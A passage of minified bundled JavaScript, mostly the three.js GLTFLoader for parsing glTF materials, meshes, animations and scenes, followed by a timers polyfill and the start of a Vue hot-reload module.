0!==r.glossinessFactor?r.glossinessFactor:1,e.specular=new THREE.Color(1,1,1),Array.isArray(r.specularFactor)&&e.specular.fromArray(r.specularFactor),void 0!==r.specularGlossinessTexture){var o=r.specularGlossinessTexture;i.push(n.assignTexture(e,"glossinessMap",o)),i.push(n.assignTexture(e,"specularMap",o))}return Promise.all(i)}},{key:"createMaterial",value:function(e){var t=new g(e);return t.fog=!0,t.color=e.color,t.map=void 0===e.map?null:e.map,t.lightMap=null,t.lightMapIntensity=1,t.aoMap=void 0===e.aoMap?null:e.aoMap,t.aoMapIntensity=1,t.emissive=e.emissive,t.emissiveIntensity=1,t.emissiveMap=void 0===e.emissiveMap?null:e.emissiveMap,t.bumpMap=void 0===e.bumpMap?null:e.bumpMap,t.bumpScale=1,t.normalMap=void 0===e.normalMap?null:e.normalMap,t.normalMapType=THREE.TangentSpaceNormalMap,e.normalScale&&(t.normalScale=e.normalScale),t.displacementMap=null,t.displacementScale=1,t.displacementBias=0,t.specularMap=void 0===e.specularMap?null:e.specularMap,t.specular=e.specular,t.glossinessMap=void 0===e.glossinessMap?null:e.glossinessMap,t.glossiness=e.glossiness,t.alphaMap=null,t.envMap=void 0===e.envMap?null:e.envMap,t.envMapIntensity=1,t.refractionRatio=.98,t}}]),e}(),b=function e(){_classCallCheck2(this,e),this.name=n.KHR_MESH_QUANTIZATION},_=function(e){_inherits2(n,THREE.Interpolant);var t=_createSuper(n);function n(e,r,i,a){return _classCallCheck2(this,n),t.call(this,e,r,i,a)}return _createClass2(n,[{key:"copySampleValue_",value:function(e){for(var t=this.resultBuffer,n=this.sampleValues,r=this.valueSize,i=e*r*3+r,a=0;a!==r;a++)t[a]=n[i+a];return t}}]),n}();_.prototype.beforeStart_=_.prototype.copySampleValue_,_.prototype.afterEnd_=_.prototype.copySampleValue_,_.prototype.interpolate_=function(e,t,n,r){for(var i=this.resultBuffer,a=this.sampleValues,o=this.valueSize,s=2*o,l=3*o,c=r-t,u=(n-t)/c,d=u*u,p=d*u,h=e*l,f=h-l,A=-2*p+3*d,m=p-d,v=1-A,g=m-d+u,y=0;y!==o;y++){var b=a[f+y+o],_=a[f+y+s]*c,w=a[h+y+o],C=a[h+y]*c;i[y]=v*b+g*_+A*w+m*C}return i};var w=new THREE.Quaternion,C=function(e){_inherits2(n,_);var t=_createSuper(n);function n(){return _classCallCheck2(this,n),t.apply(this,arguments)}return _createClass2(n,[{key:"interpolate_",value:function(e,t,r,i){var a=_get2(_getPrototypeOf(n.prototype),"interpolate_",this).call(this,e,t,r,i);return w.fromArray(a).normalize().toArray(a),a}}]),n}(),x={5120:Int8Array,5121:Uint8Array,5122:Int16Array,5123:Uint16Array,5125:Uint32Array,5126:Float32Array},S={9728:THREE.NearestFilter,9729:THREE.LinearFilter,9984:THREE.NearestMipmapNearestFilter,9985:THREE.LinearMipmapNearestFilter,9986:THREE.NearestMipmapLinearFilter,9987:THREE.LinearMipmapLinearFilter},k={33071:THREE.ClampToEdgeWrapping,33648:THREE.MirroredRepeatWrapping,10497:THREE.RepeatWrapping},M={SCALAR:1,VEC2:2,VEC3:3,VEC4:4,MAT2:4,MAT3:9,MAT4:16},B={POSITION:"position",NORMAL:"normal",TANGENT:"tangent",TEXCOORD_0:"uv",TEXCOORD_1:"uv2",COLOR_0:"color",WEIGHTS_0:"skinWeight",JOINTS_0:"skinIndex"},E={scale:"scale",translation:"position",rotation:"quaternion",weights:"morphTargetInfluences"},T={CUBICSPLINE:void 0,LINEAR:THREE.InterpolateLinear,STEP:THREE.InterpolateDiscrete};function P(e,t,n){for(var r in n.extensions)void 0===e[r]&&(t.userData.gltfExtensions=t.userData.gltfExtensions||{},t.userData.gltfExtensions[r]=n.extensions[r])}function I(e,t){void 0!==t.extras&&"object"===_typeof2(t.extras)&&Object.assign(e.userData,t.extras)}function F(e,t){if(e.updateMorphTargets(),void 0!==t.weights)for(var n=0,r=t.weights.length;n<r;n++)e.morphTargetInfluences[n]=t.weights[n];if(t.extras&&Array.isArray(t.extras.targetNames)){var i=t.extras.targetNames;if(e.morphTargetInfluences.length===i.length){e.morphTargetDictionary={};for(var a=0,o=i.length;a<o;a++)e.morphTargetDictionary[i[a]]=a}}}function L(e){for(var t="",n=Object.keys(e).sort(),r=0,i=n.length;r<i;r++)t+=n[r]+":"+e[n[r]]+";";return t}function O(e){switch(e){case Int8Array:return 1/127;case Uint8Array:return 1/255;case Int16Array:return 1/32767;case Uint16Array:return 1/65535;default:throw new Error("THREE.GLTFLoader: Unsupported normalized accessor component type.")}}var N=function(){function e(){var n=0<arguments.length&&void 0!==arguments[0]?arguments[0]:{},r=1<arguments.length&&void 0!==arguments[1]?arguments[1]:{};_classCallCheck2(this,e),this.json=n,this.extensions={},this.plugins={},this.options=r,this.cache=new t,this.associations=new Map,this.primitiveCache={},this.meshCache={refs:{},uses:{}},this.cameraCache={refs:{},uses:{}},this.lightCache={refs:{},uses:{}},this.textureCache={},this.nodeNamesUsed={},"undefined"!=typeof createImageBitmap&&!1===/Firefox|Safari/.test(navigator.userAgent)?this.textureLoader=new THREE.ImageBitmapLoader(this.options.manager):this.textureLoader=new THREE.TextureLoader(this.options.manager),this.textureLoader.setCrossOrigin(this.options.crossOrigin),this.textureLoader.setRequestHeader(this.options.requestHeader),this.fileLoader=new THREE.FileLoader(this.options.manager),this.fileLoader.setResponseType("arraybuffer"),"use-credentials"===this.options.crossOrigin&&this.fileLoader.setWithCredentials(!0)}return _createClass2(e,[{key:"setExtensions",value:function(e){this.extensions=e}},{key:"setPlugins",value:function(e){this.plugins=e}},{key:"parse",value:function(e,t){var n=this,r=this.json,i=this.extensions;this.cache.removeAll(),this._invokeAll((function(e){return e._markDefs&&e._markDefs()})),Promise.all(this._invokeAll((function(e){return e.beforeRoot&&e.beforeRoot()}))).then((function(){return Promise.all([n.getDependencies("scene"),n.getDependencies("animation"),n.getDependencies("camera")])})).then((function(t){var a={scene:t[0][r.scene||0],scenes:t[0],animations:t[1],cameras:t[2],asset:r.asset,parser:n,userData:{}};P(i,a,r),I(a,r),Promise.all(n._invokeAll((function(e){return e.afterRoot&&e.afterRoot(a)}))).then((function(){e(a)}))})).catch(t)}},{key:"_markDefs",value:function(){for(var e=this.json.nodes||[],t=this.json.skins||[],n=this.json.meshes||[],r=0,i=t.length;r<i;r++)for(var a=t[r].joints,o=0,s=a.length;o<s;o++)e[a[o]].isBone=!0;for(var l=0,c=e.length;l<c;l++){var u=e[l];void 0!==u.mesh&&(this._addNodeRef(this.meshCache,u.mesh),void 0!==u.skin&&(n[u.mesh].isSkinnedMesh=!0)),void 0!==u.camera&&this._addNodeRef(this.cameraCache,u.camera)}}},{key:"_addNodeRef",value:function(e,t){void 0!==t&&(void 0===e.refs[t]&&(e.refs[t]=e.uses[t]=0),e.refs[t]++)}},{key:"_getNodeRef",value:function(e,t,n){var r=this;if(e.refs[t]<=1)return n;var i=n.clone();return function e(t,n){var i=r.associations.get(t);null!=i&&r.associations.set(n,i);var a,o=_createForOfIteratorHelper(t.children.entries());try{for(o.s();!(a=o.n()).done;){var s=_slicedToArray(a.value,2),l=s[0];e(s[1],n.children[l])}}catch(e){o.e(e)}finally{o.f()}}(n,i),i.name+="_instance_"+e.uses[t]++,i}},{key:"_invokeOne",value:function(e){var t=Object.values(this.plugins);t.push(this);for(var n=0;n<t.length;n++){var r=e(t[n]);if(r)return r}return null}},{key:"_invokeAll",value:function(e){var t=Object.values(this.plugins);t.unshift(this);for(var n=[],r=0;r<t.length;r++){var i=e(t[r]);i&&n.push(i)}return n}},{key:"getDependency",value:function(e,t){var n=e+":"+t,r=this.cache.get(n);if(!r){switch(e){case"scene":r=this.loadScene(t);break;case"node":r=this.loadNode(t);break;case"mesh":r=this._invokeOne((function(e){return e.loadMesh&&e.loadMesh(t)}));break;case"accessor":r=this.loadAccessor(t);break;case"bufferView":r=this._invokeOne((function(e){return e.loadBufferView&&e.loadBufferView(t)}));break;case"buffer":r=this.loadBuffer(t);break;case"material":r=this._invokeOne((function(e){return e.loadMaterial&&e.loadMaterial(t)}));break;case"texture":r=this._invokeOne((function(e){return e.loadTexture&&e.loadTexture(t)}));break;case"skin":r=this.loadSkin(t);break;case"animation":r=this.loadAnimation(t);break;case"camera":r=this.loadCamera(t);break;default:throw new Error("Unknown type: "+e)}this.cache.add(n,r)}return r}},{key:"getDependencies",value:function(e){var t=this.cache.get(e);if(!t){var n=this,r=this.json[e+("mesh"===e?"es":"s")]||[];t=Promise.all(r.map((function(t,r){return n.getDependency(e,r)}))),this.cache.add(e,t)}return t}},{key:"loadBuffer",value:function(e){var t=this.json.buffers[e],r=this.fileLoader;if(t.type&&"arraybuffer"!==t.type)throw new Error("THREE.GLTFLoader: "+t.type+" buffer type is not supported.");if(void 0===t.uri&&0===e)return Promise.resolve(this.extensions[n.KHR_BINARY_GLTF].body);var i=this.options;return new Promise((function(e,n){r.load(THREE.LoaderUtils.resolveURL(t.uri,i.path),e,void 0,(function(){n(new Error('THREE.GLTFLoader: Failed to load buffer "'+t.uri+'".'))}))}))}},{key:"loadBufferView",value:function(e){var t=this.json.bufferViews[e];return this.getDependency("buffer",t.buffer).then((function(e){var n=t.byteLength||0,r=t.byteOffset||0;return e.slice(r,r+n)}))}},{key:"loadAccessor",value:function(e){var t=this,n=this.json,r=this.json.accessors[e];if(void 0===r.bufferView&&void 0===r.sparse)return Promise.resolve(null);var i=[];return void 0!==r.bufferView?i.push(this.getDependency("bufferView",r.bufferView)):i.push(null),void 0!==r.sparse&&(i.push(this.getDependency("bufferView",r.sparse.indices.bufferView)),i.push(this.getDependency("bufferView",r.sparse.values.bufferView))),Promise.all(i).then((function(e){var i,a,o=e[0],s=M[r.type],l=x[r.componentType],c=l.BYTES_PER_ELEMENT,u=c*s,d=r.byteOffset||0,p=void 0!==r.bufferView?n.bufferViews[r.bufferView].byteStride:void 0,h=!0===r.normalized;if(p&&p!==u){var f=Math.floor(d/p),A="InterleavedBuffer:"+r.bufferView+":"+r.componentType+":"+f+":"+r.count,m=t.cache.get(A);m||(i=new l(o,f*p,r.count*p/c),m=new THREE.InterleavedBuffer(i,p/c),t.cache.add(A,m)),a=new THREE.InterleavedBufferAttribute(m,s,d%p/c,h)}else i=null===o?new l(r.count*s):new l(o,d,r.count*s),a=new THREE.BufferAttribute(i,s,h);if(void 0!==r.sparse){var v=M.SCALAR,g=x[r.sparse.indices.componentType],y=r.sparse.indices.byteOffset||0,b=r.sparse.values.byteOffset||0,_=new g(e[1],y,r.sparse.count*v),w=new l(e[2],b,r.sparse.count*s);null!==o&&(a=new THREE.BufferAttribute(a.array.slice(),a.itemSize,a.normalized));for(var C=0,S=_.length;C<S;C++){var k=_[C];if(a.setX(k,w[C*s]),2<=s&&a.setY(k,w[C*s+1]),3<=s&&a.setZ(k,w[C*s+2]),4<=s&&a.setW(k,w[C*s+3]),5<=s)throw new Error("THREE.GLTFLoader: Unsupported itemSize in sparse THREE.BufferAttribute.")}}return a}))}},{key:"loadTexture",value:function(e){var t=this.json,n=this.options,r=t.textures[e],i=t.images[r.source],a=this.textureLoader;if(i.uri){var o=n.manager.getHandler(i.uri);null!==o&&(a=o)}return this.loadTextureImage(e,i,a)}},{key:"loadTextureImage",value:function(e,t,n){var r=this,i=this.json,a=this.options,o=i.textures[e],s=(t.uri||t.bufferView)+":"+o.sampler;if(this.textureCache[s])return this.textureCache[s];var l=self.URL||self.webkitURL,c=t.uri||"",u=!1;if(void 0!==t.bufferView)c=r.getDependency("bufferView",t.bufferView).then((function(e){u=!0;var n=new Blob([e],{type:t.mimeType});return c=l.createObjectURL(n)}));else if(void 0===t.uri)throw new Error("THREE.GLTFLoader: Image "+e+" is missing URI and bufferView");var d=Promise.resolve(c).then((function(e){return new Promise((function(t,r){var i=t;!0===n.isImageBitmapLoader&&(i=function(e){var n=new THREE.Texture(e);n.needsUpdate=!0,t(n)}),n.load(THREE.LoaderUtils.resolveURL(e,a.path),i,void 0,r)}))})).then((function(t){!0===u&&l.revokeObjectURL(c),t.flipY=!1,o.name&&(t.name=o.name);var n=(i.samplers||{})[o.sampler]||{};return t.magFilter=S[n.magFilter]||THREE.LinearFilter,t.minFilter=S[n.minFilter]||THREE.LinearMipmapLinearFilter,t.wrapS=k[n.wrapS]||THREE.RepeatWrapping,t.wrapT=k[n.wrapT]||THREE.RepeatWrapping,r.associations.set(t,{textures:e}),t})).catch((function(){return null}));return this.textureCache[s]=d}},{key:"assignTexture",value:function(e,t,r){var i=this;return this.getDependency("texture",r.index).then((function(a){if(void 0!==r.texCoord&&0!=r.texCoord&&("aoMap"!==t||r.texCoord),i.extensions[n.KHR_TEXTURE_TRANSFORM]){var o=void 0!==r.extensions?r.extensions[n.KHR_TEXTURE_TRANSFORM]:void 0;if(o){var s=i.associations.get(a);a=i.extensions[n.KHR_TEXTURE_TRANSFORM].extendTexture(a,o),i.associations.set(a,s)}}return e[t]=a}))}},{key:"assignFinalMaterial",value:function(e){var t=e.geometry,n=e.material,r=void 0===t.attributes.tangent,i=void 0!==t.attributes.color,a=void 0===t.attributes.normal;if(e.isPoints){var o="PointsMaterial:"+n.uuid,s=this.cache.get(o);s||(s=new THREE.PointsMaterial,THREE.Material.prototype.copy.call(s,n),s.color.copy(n.color),s.map=n.map,s.sizeAttenuation=!1,this.cache.add(o,s)),n=s}else if(e.isLine){var l="LineBasicMaterial:"+n.uuid,c=this.cache.get(l);c||(c=new THREE.LineBasicMaterial,THREE.Material.prototype.copy.call(c,n),c.color.copy(n.color),this.cache.add(l,c)),n=c}if(r||i||a){var u="ClonedMaterial:"+n.uuid+":";n.isGLTFSpecularGlossinessMaterial&&(u+="specular-glossiness:"),r&&(u+="derivative-tangents:"),i&&(u+="vertex-colors:"),a&&(u+="flat-shading:");var d=this.cache.get(u);d||(d=n.clone(),i&&(d.vertexColors=!0),a&&(d.flatShading=!0),r&&(d.normalScale&&(d.normalScale.y*=-1),d.clearcoatNormalScale&&(d.clearcoatNormalScale.y*=-1)),this.cache.add(u,d),this.associations.set(d,this.associations.get(n))),n=d}n.aoMap&&void 0===t.attributes.uv2&&void 0!==t.attributes.uv&&t.setAttribute("uv2",t.attributes.uv),e.material=n}},{key:"getMaterialType",value:function(){return THREE.MeshStandardMaterial}},{key:"loadMaterial",value:function(e){var t,r=this,i=this.json,a=this.extensions,o=i.materials[e],s={},l=o.extensions||{},c=[];if(l[n.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS]){var u=a[n.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS];t=u.getMaterialType(),c.push(u.extendParams(s,o,r))}else if(l[n.KHR_MATERIALS_UNLIT]){var d=a[n.KHR_MATERIALS_UNLIT];t=d.getMaterialType(),c.push(d.extendParams(s,o,r))}else{var p=o.pbrMetallicRoughness||{};if(s.color=new THREE.Color(1,1,1),s.opacity=1,Array.isArray(p.baseColorFactor)){var h=p.baseColorFactor;s.color.fromArray(h),s.opacity=h[3]}void 0!==p.baseColorTexture&&c.push(r.assignTexture(s,"map",p.baseColorTexture)),s.metalness=void 0!==p.metallicFactor?p.metallicFactor:1,s.roughness=void 0!==p.roughnessFactor?p.roughnessFactor:1,void 0!==p.metallicRoughnessTexture&&(c.push(r.assignTexture(s,"metalnessMap",p.metallicRoughnessTexture)),c.push(r.assignTexture(s,"roughnessMap",p.metallicRoughnessTexture))),t=this._invokeOne((function(t){return t.getMaterialType&&t.getMaterialType(e)})),c.push(Promise.all(this._invokeAll((function(t){return t.extendMaterialParams&&t.extendMaterialParams(e,s)}))))}!0===o.doubleSided&&(s.side=THREE.DoubleSide);var f=o.alphaMode||"OPAQUE";if("BLEND"===f?(s.transparent=!0,s.depthWrite=!1):(s.format=THREE.RGBFormat,s.transparent=!1,"MASK"===f&&(s.alphaTest=void 0!==o.alphaCutoff?o.alphaCutoff:.5)),void 0!==o.normalTexture&&t!==THREE.MeshBasicMaterial&&(c.push(r.assignTexture(s,"normalMap",o.normalTexture)),s.normalScale=new THREE.Vector2(1,1),void 0!==o.normalTexture.scale)){var A=o.normalTexture.scale;s.normalScale.set(A,A)}return void 0!==o.occlusionTexture&&t!==THREE.MeshBasicMaterial&&(c.push(r.assignTexture(s,"aoMap",o.occlusionTexture)),void 0!==o.occlusionTexture.strength&&(s.aoMapIntensity=o.occlusionTexture.strength)),void 0!==o.emissiveFactor&&t!==THREE.MeshBasicMaterial&&(s.emissive=(new THREE.Color).fromArray(o.emissiveFactor)),void 0!==o.emissiveTexture&&t!==THREE.MeshBasicMaterial&&c.push(r.assignTexture(s,"emissiveMap",o.emissiveTexture)),Promise.all(c).then((function(){var i;return i=t===g?a[n.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS].createMaterial(s):new t(s),o.name&&(i.name=o.name),i.map&&(i.map.encoding=THREE.sRGBEncoding),i.emissiveMap&&(i.emissiveMap.encoding=THREE.sRGBEncoding),I(i,o),r.associations.set(i,{materials:e}),o.extensions&&P(a,i,o),i}))}},{key:"createUniqueName",value:function(e){for(var t=THREE.PropertyBinding.sanitizeNodeName(e||""),n=t,r=1;this.nodeNamesUsed[n];++r)n=t+"_"+r;return this.nodeNamesUsed[n]=!0,n}},{key:"loadGeometries",value:function(e){var t=this,r=this.extensions,i=this.primitiveCache;function a(e){return r[n.KHR_DRACO_MESH_COMPRESSION].decodePrimitive(e,t).then((function(n){return R(n,e,t)}))}for(var o,s,l=[],c=0,u=e.length;c<u;c++){var d=e[c],p=(s=(o=d).extensions&&o.extensions[n.KHR_DRACO_MESH_COMPRESSION])?"draco:"+s.bufferView+":"+s.indices+":"+L(s.attributes):o.indices+":"+L(o.attributes)+":"+o.mode,h=i[p];if(h)l.push(h.promise);else{var f;f=d.extensions&&d.extensions[n.KHR_DRACO_MESH_COMPRESSION]?a(d):R(new THREE.BufferGeometry,d,t),i[p]={primitive:d,promise:f},l.push(f)}}return Promise.all(l)}},{key:"loadMesh",value:function(e){for(var t,n=this,r=this.json,i=this.extensions,a=r.meshes[e],o=a.primitives,s=[],l=0,c=o.length;l<c;l++){var u=void 0===o[l].material?(void 0===(t=this.cache).DefaultMaterial&&(t.DefaultMaterial=new THREE.MeshStandardMaterial({color:16777215,emissive:0,metalness:1,roughness:1,transparent:!1,depthTest:!0,side:THREE.FrontSide})),t.DefaultMaterial):this.getDependency("material",o[l].material);s.push(u)}return s.push(n.loadGeometries(o)),Promise.all(s).then((function(t){for(var r=t.slice(0,t.length-1),s=t[t.length-1],l=[],c=0,u=s.length;c<u;c++){var d=s[c],p=o[c],h=void 0,f=r[c];if(4===p.mode||5===p.mode||6===p.mode||void 0===p.mode)!0!==(h=!0===a.isSkinnedMesh?new THREE.SkinnedMesh(d,f):new THREE.Mesh(d,f)).isSkinnedMesh||h.geometry.attributes.skinWeight.normalized||h.normalizeSkinWeights(),5===p.mode?h.geometry=j(h.geometry,THREE.TriangleStripDrawMode):6===p.mode&&(h.geometry=j(h.geometry,THREE.TriangleFanDrawMode));else if(1===p.mode)h=new THREE.LineSegments(d,f);else if(3===p.mode)h=new THREE.Line(d,f);else if(2===p.mode)h=new THREE.LineLoop(d,f);else{if(0!==p.mode)throw new Error("THREE.GLTFLoader: Primitive mode unsupported: "+p.mode);h=new THREE.Points(d,f)}0<Object.keys(h.geometry.morphAttributes).length&&F(h,a),h.name=n.createUniqueName(a.name||"mesh_"+e),I(h,a),p.extensions&&P(i,h,p),n.assignFinalMaterial(h),l.push(h)}for(var A=0,m=l.length;A<m;A++)n.associations.set(l[A],{meshes:e,primitives:A});if(1===l.length)return l[0];var v=new THREE.Group;n.associations.set(v,{meshes:e});for(var g=0,y=l.length;g<y;g++)v.add(l[g]);return v}))}},{key:"loadCamera",value:function(e){var t,n=this.json.cameras[e],r=n[n.type];if(r)return"perspective"===n.type?t=new THREE.PerspectiveCamera(THREE.MathUtils.radToDeg(r.yfov),r.aspectRatio||1,r.znear||1,r.zfar||2e6):"orthographic"===n.type&&(t=new THREE.OrthographicCamera(-r.xmag,r.xmag,r.ymag,-r.ymag,r.znear,r.zfar)),n.name&&(t.name=this.createUniqueName(n.name)),I(t,n),Promise.resolve(t)}},{key:"loadSkin",value:function(e){var t=this.json.skins[e],n={joints:t.joints};return void 0===t.inverseBindMatrices?Promise.resolve(n):this.getDependency("accessor",t.inverseBindMatrices).then((function(e){return n.inverseBindMatrices=e,n}))}},{key:"loadAnimation",value:function(e){for(var t=this.json.animations[e],n=[],r=[],i=[],a=[],o=[],s=0,l=t.channels.length;s<l;s++){var c=t.channels[s],u=t.samplers[c.sampler],d=c.target,p=void 0!==d.node?d.node:d.id,h=void 0!==t.parameters?t.parameters[u.input]:u.input,f=void 0!==t.parameters?t.parameters[u.output]:u.output;n.push(this.getDependency("node",p)),r.push(this.getDependency("accessor",h)),i.push(this.getDependency("accessor",f)),a.push(u),o.push(d)}return Promise.all([Promise.all(n),Promise.all(r),Promise.all(i),Promise.all(a),Promise.all(o)]).then((function(n){for(var r=n[0],i=n[1],a=n[2],o=n[3],s=n[4],l=[],c=function(e,t){var n=r[e],c=i[e],u=a[e],d=o[e],p=s[e];if(void 0===n)return"continue";n.updateMatrix(),n.matrixAutoUpdate=!0;var h=void 0;switch(E[p.path]){case E.weights:h=THREE.NumberKeyframeTrack;break;case E.rotation:h=THREE.QuaternionKeyframeTrack;break;case E.position:case E.scale:default:h=THREE.VectorKeyframeTrack}var f=n.name?n.name:n.uuid,A=void 0!==d.interpolation?T[d.interpolation]:THREE.InterpolateLinear,m=[];E[p.path]===E.weights?n.traverse((function(e){e.morphTargetInfluences&&m.push(e.name?e.name:e.uuid)})):m.push(f);var v=u.array;if(u.normalized){for(var g=O(v.constructor),y=new Float32Array(v.length),b=0,w=v.length;b<w;b++)y[b]=v[b]*g;v=y}for(var x=0,S=m.length;x<S;x++){var k=new h(m[x]+"."+E[p.path],c.array,v,A);"CUBICSPLINE"===d.interpolation&&(k.createInterpolant=function(e){return new(this instanceof THREE.QuaternionKeyframeTrack?C:_)(this.times,this.values,this.getValueSize()/3,e)},k.createInterpolant.isInterpolantFactoryMethodGLTFCubicSpline=!0),l.push(k)}},u=0,d=r.length;u<d;u++)c(u);var p=t.name?t.name:"animation_"+e;return new THREE.AnimationClip(p,void 0,l)}))}},{key:"createNodeMesh",value:function(e){var t=this.json,n=this,r=t.nodes[e];return void 0===r.mesh?null:n.getDependency("mesh",r.mesh).then((function(e){var t=n._getNodeRef(n.meshCache,r.mesh,e);return void 0!==r.weights&&t.traverse((function(e){if(e.isMesh)for(var t=0,n=r.weights.length;t<n;t++)e.morphTargetInfluences[t]=r.weights[t]})),t}))}},{key:"loadNode",value:function(e){var t,n,r=this.json,i=this.extensions,a=this,o=r.nodes[e],s=o.name?a.createUniqueName(o.name):"";return(t=[],n=a._invokeOne((function(t){return t.createNodeMesh&&t.createNodeMesh(e)})),n&&t.push(n),void 0!==o.camera&&t.push(a.getDependency("camera",o.camera).then((function(e){return a._getNodeRef(a.cameraCache,o.camera,e)}))),a._invokeAll((function(t){return t.createNodeAttachment&&t.createNodeAttachment(e)})).forEach((function(e){t.push(e)})),Promise.all(t)).then((function(t){var n;if((n=!0===o.isBone?new THREE.Bone:1<t.length?new THREE.Group:1===t.length?t[0]:new THREE.Object3D)!==t[0])for(var r=0,l=t.length;r<l;r++)n.add(t[r]);if(o.name&&(n.userData.name=o.name,n.name=s),I(n,o),o.extensions&&P(i,n,o),void 0!==o.matrix){var c=new THREE.Matrix4;c.fromArray(o.matrix),n.applyMatrix4(c)}else void 0!==o.translation&&n.position.fromArray(o.translation),void 0!==o.rotation&&n.quaternion.fromArray(o.rotation),void 0!==o.scale&&n.scale.fromArray(o.scale);return a.associations.has(n)||a.associations.set(n,{}),a.associations.get(n).nodes=e,n}))}},{key:"loadScene",value:function(e){var t=this.json,n=this.extensions,r=this.json.scenes[e],i=this,a=new THREE.Group;r.name&&(a.name=i.createUniqueName(r.name)),I(a,r),r.extensions&&P(n,a,r);for(var o=r.nodes||[],s=[],l=0,c=o.length;l<c;l++)s.push(D(o[l],a,t,i));return Promise.all(s).then((function(){return i.associations=function(e){var t,n=new Map,r=_createForOfIteratorHelper(i.associations);try{for(r.s();!(t=r.n()).done;){var a=_slicedToArray(t.value,2),o=a[0],s=a[1];(o instanceof THREE.Material||o instanceof THREE.Texture)&&n.set(o,s)}}catch(e){r.e(e)}finally{r.f()}return e.traverse((function(e){var t=i.associations.get(e);null!=t&&n.set(e,t)})),n}(a),a}))}}]),e}();function D(e,t,n,r){var i=n.nodes[e];return r.getDependency("node",e).then((function(e){return void 0===i.skin?e:r.getDependency("skin",i.skin).then((function(e){for(var n=[],i=0,a=(t=e).joints.length;i<a;i++)n.push(r.getDependency("node",t.joints[i]));return Promise.all(n)})).then((function(n){return e.traverse((function(e){if(e.isMesh){for(var r=[],i=[],a=0,o=n.length;a<o;a++){var s=n[a];if(s){r.push(s);var l=new THREE.Matrix4;void 0!==t.inverseBindMatrices&&l.fromArray(t.inverseBindMatrices.array,16*a),i.push(l)}}e.bind(new THREE.Skeleton(r,i),e.matrixWorld)}})),e}));var t})).then((function(e){t.add(e);var a=[];if(i.children)for(var o=i.children,s=0,l=o.length;s<l;s++){var c=o[s];a.push(D(c,e,n,r))}return Promise.all(a)}))}function R(e,t,n){var r=t.attributes,i=[];function a(t,r){return n.getDependency("accessor",t).then((function(t){e.setAttribute(r,t)}))}for(var o in r){var s=B[o]||o.toLowerCase();s in e.attributes||i.push(a(r[o],s))}if(void 0!==t.indices&&!e.index){var l=n.getDependency("accessor",t.indices).then((function(t){e.setIndex(t)}));i.push(l)}return I(e,t),function(e,t,n){var r=t.attributes,i=new THREE.Box3;if(void 0!==r.POSITION){var a=n.json.accessors[r.POSITION],o=a.min,s=a.max;if(void 0!==o&&void 0!==s){if(i.set(new THREE.Vector3(o[0],o[1],o[2]),new THREE.Vector3(s[0],s[1],s[2])),a.normalized){var l=O(x[a.componentType]);i.min.multiplyScalar(l),i.max.multiplyScalar(l)}var c=t.targets;if(void 0!==c){for(var u=new THREE.Vector3,d=new THREE.Vector3,p=0,h=c.length;p<h;p++){var f=c[p];if(void 0!==f.POSITION){var A=n.json.accessors[f.POSITION],m=A.min,v=A.max;if(void 0!==m&&void 0!==v){if(d.setX(Math.max(Math.abs(m[0]),Math.abs(v[0]))),d.setY(Math.max(Math.abs(m[1]),Math.abs(v[1]))),d.setZ(Math.max(Math.abs(m[2]),Math.abs(v[2]))),A.normalized){var g=O(x[A.componentType]);d.multiplyScalar(g)}u.max(d)}}}i.expandByVector(u)}e.boundingBox=i;var y=new THREE.Sphere;i.getCenter(y.center),y.radius=i.min.distanceTo(i.max)/2,e.boundingSphere=y}}}(e,t,n),Promise.all(i).then((function(){return void 0!==t.targets?function(e,t,n){for(var r=!1,i=!1,a=0,o=t.length;a<o;a++){var s=t[a];if(void 0!==s.POSITION&&(r=!0),void 0!==s.NORMAL&&(i=!0),r&&i)break}if(!r&&!i)return Promise.resolve(e);for(var l=[],c=[],u=0,d=t.length;u<d;u++){var p=t[u];if(r){var h=void 0!==p.POSITION?n.getDependency("accessor",p.POSITION):e.attributes.position;l.push(h)}if(i){var f=void 0!==p.NORMAL?n.getDependency("accessor",p.NORMAL):e.attributes.normal;c.push(f)}}return Promise.all([Promise.all(l),Promise.all(c)]).then((function(t){var n=t[0],a=t[1];return r&&(e.morphAttributes.position=n),i&&(e.morphAttributes.normal=a),e.morphTargetsRelative=!0,e}))}(e,t.targets,n):e}))}function j(e,t){var n=e.getIndex();if(null===n){var r=[],i=e.getAttribute("position");if(void 0===i)return e;for(var a=0;a<i.count;a++)r.push(a);e.setIndex(r),n=e.getIndex()}var o=n.count-2,s=[];if(t===THREE.TriangleFanDrawMode)for(var l=1;l<=o;l++)s.push(n.getX(0)),s.push(n.getX(l)),s.push(n.getX(l+1));else for(var c=0;c<o;c++)c%2==0?(s.push(n.getX(c)),s.push(n.getX(c+1)),s.push(n.getX(c+2))):(s.push(n.getX(c+2)),s.push(n.getX(c+1)),s.push(n.getX(c)));s.length;var u=e.clone();return u.setIndex(s),u}THREE.GLTFLoader=e}()},{}],274:[function(e,t,n){(function(t,r){(function(){var i=e("process/browser.js").nextTick,a=Function.prototype.apply,o=Array.prototype.slice,s={},l=0;function c(e,t){this._id=e,this._clearFn=t}n.setTimeout=function(){return new c(a.call(setTimeout,window,arguments),clearTimeout)},n.setInterval=function(){return new c(a.call(setInterval,window,arguments),clearInterval)},n.clearTimeout=n.clearInterval=function(e){e.close()},c.prototype.unref=c.prototype.ref=function(){},c.prototype.close=function(){this._clearFn.call(window,this._id)},n.enroll=function(e,t){clearTimeout(e._idleTimeoutId),e._idleTimeout=t},n.unenroll=function(e){clearTimeout(e._idleTimeoutId),e._idleTimeout=-1},n._unrefActive=n.active=function(e){clearTimeout(e._idleTimeoutId);var t=e._idleTimeout;0<=t&&(e._idleTimeoutId=setTimeout((function(){e._onTimeout&&e._onTimeout()}),t))},n.setImmediate="function"==typeof t?t:function(e){var t=l++,r=!(arguments.length<2)&&o.call(arguments,1);return s[t]=!0,i((function(){s[t]&&(r?e.apply(null,r):e.call(null),n.clearImmediate(t))})),t},n.clearImmediate="function"==typeof r?r:function(e){delete s[e]}}).call(this)}).call(this,e("timers").setImmediate,e("timers").clearImmediate)},{"process/browser.js":229,timers:274}],275:[function(e,t,n){var r,i,a=Object.create(null);"undefined"!=typeof window&&(window.__VUE_HOT_MAP__=a);var o=!1,s="beforeCreate";function l(e,t){if(t.functional){var n=t.render;t.render=function(t,r){var i=a[e].instances;return r&&i.indexOf(r.parent)<0&&i.push(r.parent),n(t,r)}}else c(t,s,(function(){var t=a[e];t.Ctor||(t.Ctor=this.constructor),t.instances.push(this)})),c(t,"beforeDestroy",(function(){var 